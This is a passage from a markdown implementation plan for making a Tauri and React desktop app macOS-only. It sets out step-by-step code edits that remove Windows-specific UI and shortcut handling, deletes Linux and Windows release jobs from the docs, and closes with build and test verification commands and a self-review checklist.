    parts.push("Alt");
  }
  if (parsed.shift) {
    parts.push("Shift");
  }
  const key =
    ACCELERATOR_KEYS[parsed.key] ??
    (parsed.key.length === 1 ? parsed.key.toUpperCase() : parsed.key);
  if (!key) {
    return null;
  }
  return [...parts, key].join("+");
}
```

- [ ] **Step 3: Replace `shortcuts.test.ts` with macOS-only tests**

Replace the entire file with:

```typescript
// @vitest-environment jsdom

import { describe, expect, it } from "vitest";
import { formatShortcut, matchesShortcut, toMenuAccelerator } from "./shortcuts";

function withNavigatorPlatform(platform: string, fn: () => void) {
  const originalUserAgentData = Object.getOwnPropertyDescriptor(navigator, "userAgentData");

  Object.defineProperty(navigator, "userAgentData", {
    value: { platform },
    configurable: true,
  });

  try {
    fn();
  } finally {
    if (originalUserAgentData) {
      Object.defineProperty(navigator, "userAgentData", originalUserAgentData);
    } else {
      delete (navigator as unknown as { userAgentData?: unknown }).userAgentData;
    }
  }
}

describe("shortcuts", () => {
  it("formats macOS shortcuts with symbols", () => {
    withNavigatorPlatform("MacIntel", () => {
      expect(formatShortcut("cmd+ctrl+a")).toBe("⌘⌃A");
      expect(formatShortcut("cmd+shift+enter")).toBe("⌘⇧Enter");
      expect(toMenuAccelerator("cmd+ctrl+a")).toBe("Cmd+Ctrl+A");
    });
  });

  it("requires both cmd and ctrl on macOS", () => {
    withNavigatorPlatform("MacIntel", () => {
      const cmdCtrl = new KeyboardEvent("keydown", {
        key: "a",
        metaKey: true,
        ctrlKey: true,
      });
      expect(matchesShortcut(cmdCtrl, "cmd+ctrl+a")).toBe(true);

      const ctrlOnly = new KeyboardEvent("keydown", { key: "a", ctrlKey: true });
      expect(matchesShortcut(ctrlOnly, "cmd+ctrl+a")).toBe(false);
    });
  });
});
```

- [ ] **Step 4: Simplify `useLayoutOrchestration.ts` to macOS values**

`old_string`:
```typescript
import type { AppView } from "@app/constants/appViews";
import { isWindowsPlatform } from "@utils/platformPaths";
import { type CSSProperties, useMemo } from "react";
```

`new_string`:
```typescript
import type { AppView } from "@app/constants/appViews";
import { type CSSProperties, useMemo } from "react";
```

`old_string`:
```typescript
  const isWindows = isWindowsPlatform();
  const showGitDetail = Boolean(selectedDiffPath) && centerMode === "diff";
  const isThreadOpen = Boolean(activeThreadId && showComposer);

  const appClassName = `app layout-desktop${
    shouldReduceTransparency ? " reduced-transparency" : ""
  }${sidebarCollapsed ? " sidebar-collapsed" : ""
  }${rightPanelCollapsed ? " right-panel-collapsed" : ""
  }${appView === "calendar" ? " is-calendar" : ""}${isWindows ? " is-windows" : ""}`;
```

`new_string`:
```typescript
  const showGitDetail = Boolean(selectedDiffPath) && centerMode === "diff";
  const isThreadOpen = Boolean(activeThreadId && showComposer);

  const appClassName = `app layout-desktop${
    shouldReduceTransparency ? " reduced-transparency" : ""
  }${sidebarCollapsed ? " sidebar-collapsed" : ""
  }${rightPanelCollapsed ? " right-panel-collapsed" : ""
  }${appView === "calendar" ? " is-calendar" : ""}`;
```

`old_string`:
```typescript
        "--sidebar-top-padding": isWindows ? "10px" : "36px",
        "--right-panel-top-padding": isWindows
          ? "calc(var(--main-topbar-height, 44px) + 6px)"
          : "12px",
        "--home-scroll-offset": isWindows ? "var(--main-topbar-height, 44px)" : "0px",
        "--window-caption-width": isWindows ? "138px" : "0px",
        "--window-caption-gap": isWindows ? "10px" : "0px",
        ...(isWindows
          ? {
              "--titlebar-height": "8px",
              "--titlebar-drag-strip-z-index": "5",
              "--side-panel-drag-strip-height": "56px",
              "--window-drag-hit-height": "44px",
              "--window-drag-strip-pointer-events": "none",
              "--titlebar-inset-left": "0px",
              "--titlebar-collapsed-left-extra": "0px",
              "--titlebar-toggle-size": "32px",
              "--titlebar-toggle-side-gap": "14px",
              "--titlebar-toggle-title-offset": "0px",
              "--titlebar-toggle-offset": "0px",
            }
          : {}),
```

`new_string`:
```typescript
        "--sidebar-top-padding": "36px",
        "--right-panel-top-padding": "12px",
        "--home-scroll-offset": "0px",
        "--window-caption-width": "0px",
        "--window-caption-gap": "0px",
```

Also remove `isWindows` from the `useMemo` dependency array.

- [ ] **Step 5: Simplify `useSettingsViewOrchestration.ts`**

`old_string`:
```typescript
import {
  COMPOSER_PRESET_CONFIGS,
  COMPOSER_PRESET_LABELS,
  DICTATION_MODELS,
} from "@settings/components/settingsViewConstants";
import { isMacPlatform, isWindowsPlatform } from "@utils/platformPaths";
import { useMemo } from "react";
```

`new_string`:
```typescript
import {
  COMPOSER_PRESET_CONFIGS,
  COMPOSER_PRESET_LABELS,
  DICTATION_MODELS,
} from "@settings/components/settingsViewConstants";
import { useMemo } from "react";
```

`old_string`:
```typescript
  const optionKeyLabel = isMacPlatform() ? "Option" : "Alt";
  const metaKeyLabel = isMacPlatform() ? "Command" : isWindowsPlatform() ? "Windows" : "Meta";
  const followUpShortcutLabel = isMacPlatform() ? "Shift+Cmd+Enter" : "Shift+Ctrl+Enter";
```

`new_string`:
```typescript
  const optionKeyLabel = "Option";
  const metaKeyLabel = "Command";
  const followUpShortcutLabel = "Shift+Cmd+Enter";
```

- [ ] **Step 6: Simplify `features/app/constants.ts`**

`old_string`:
```typescript
import { fileManagerName, isMacPlatform, isWindowsPlatform } from "@utils/platformPaths";
import type { OpenAppTarget } from "@/types";

export const OPEN_APP_STORAGE_KEY = "open-workspace-app";
export const DEFAULT_OPEN_APP_ID = isWindowsPlatform() ? "finder" : "vscode";

export type OpenAppId = string;

export const DEFAULT_OPEN_APP_TARGETS: OpenAppTarget[] = isMacPlatform()
  ? [
```

`new_string`:
```typescript
import { fileManagerName } from "@utils/platformPaths";
import type { OpenAppTarget } from "@/types";

export const OPEN_APP_STORAGE_KEY = "open-workspace-app";
export const DEFAULT_OPEN_APP_ID = "vscode";

export type OpenAppId = string;

export const DEFAULT_OPEN_APP_TARGETS: OpenAppTarget[] = [
```

Then remove the trailing `]
  : [` and the non-macOS branch, and replace the final `];` with `];` after the macOS array.

- [ ] **Step 7: Remove `WindowCaptionControls` component and test, and its usage**

```bash
rm desktop-ui/src/features/layout/components/WindowCaptionControls.tsx \
   desktop-ui/src/features/layout/components/WindowCaptionControls.test.tsx
```

In `desktop-ui/src/features/app/components/MainAppShell.tsx`:

`old_string`:
```typescript
import { WindowCaptionControls } from "@/features/layout/components/WindowCaptionControls";
```

Remove that import line.

`old_string`:
```tsx
      <TitlebarExpandControls {...sidebarToggleProps} />
      <WindowCaptionControls />
      {shouldLoadGitHubPanelData ? (
```

`new_string`:
```tsx
      <TitlebarExpandControls {...sidebarToggleProps} />
      {shouldLoadGitHubPanelData ? (
```

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "chore(desktop-ui): simplify platform utilities and remove Windows-only UI"
```

---

## Task 10: Update release documentation

**Files:**
- Modify: `docs/plan-release-cicd.md`
- Modify: `docs/superpowers/plans/2026-06-16-release-versioning-cicd.md`

- [ ] **Step 1: In `docs/plan-release-cicd.md`, remove Phase 3 (cross-platform builds)**

`old_string`:
```markdown
### Phase 3: Cross-Platform Builds
5. Add a Linux job to `release-build-artifacts.yml` building `deb`, `rpm`, and `AppImage` for `x86_64-unknown-linux-gnu`.
6. Add a Windows job to `release-build-artifacts.yml` building NSIS for `x86_64-pc-windows-msvc`.
7. Update alpha and stable release workflows to build a multi-platform `latest.json` (darwin-aarch64, darwin-x86_64, linux-x86_64, windows-x86_64).

### Phase 4: GitHub Pages & Release Pages (optional)
```

`new_string`:
```markdown
### Phase 3: GitHub Pages & Release Pages (optional)
```

- [ ] **Step 2: In `docs/superpowers/plans/2026-06-16-release-versioning-cicd.md`, remove Linux/Windows job specs**

Delete the `build-linux-x86_64` job block (lines ~520–606) and the `build-windows-x86_64` job block (lines ~567–606) from the `release-build-artifacts.yml` spec. Then update the `PLATFORM_MAP` in Task 9 from:

```python
PLATFORM_MAP = {
    "aarch64.dmg": "darwin-aarch64",
    "x86_64.dmg": "darwin-x86_64",
    "amd64.AppImage": "linux-x86_64",
    "x64-setup.exe": "windows-x86_64",
}
```

to:

```python
PLATFORM_MAP = {
    "aarch64.dmg": "darwin-aarch64",
    "x86_64.dmg": "darwin-x86_64",
}
```

- [ ] **Step 3: Commit**

```bash
git add -A
git commit -m "docs: remove Linux/Windows release plans now that platform is macOS-only"
```

---

## Task 11: Verify on macOS

**Files:**
- Run commands in workspace root

- [ ] **Step 1: Format check**

```bash
cargo fmt --all --check
```

Expected: no output (passes).

- [ ] **Step 2: Clippy**

```bash
cargo clippy --workspace --all-targets --all-features -- -D warnings
```

Expected: no warnings/errors.

- [ ] **Step 3: Tests**

```bash
cargo nextest run --workspace --all-features
```

Expected: all tests pass.

- [ ] **Step 4: Desktop UI checks**

```bash
cd desktop-ui
bun install --frozen-lockfile
bun run lint
bun run typecheck
bun run test
```

Expected: lint/typecheck/tests pass.

- [ ] **Step 5: macOS Tauri build smoke test**

```bash
cd crates/desktop
cargo tauri build --target aarch64-apple-darwin
```

Expected: build succeeds and produces `.app.tar.gz`/`.dmg` in `target/aarch64-apple-darwin/release/bundle/macos/`.

- [ ] **Step 6: Commit any final fixes**

```bash
git add -A
git commit -m "fix: address verification findings from macOS-only cleanup"
```

---

## Self-review checklist

- [ ] No `ubuntu-latest`, `windows-latest`, `x86_64-unknown-linux-gnu`, `x86_64-pc-windows-msvc`, `AppImage`, or `NSIS` references remain in CI/scripts/config.
- [ ] `cargo fmt`, `cargo clippy`, `cargo nextest`, desktop-ui lint/typecheck/tests, and `cargo tauri build --target aarch64-apple-darwin` all pass.
- [ ] `scripts/generate-updater-manifest.py` only maps darwin suffixes.
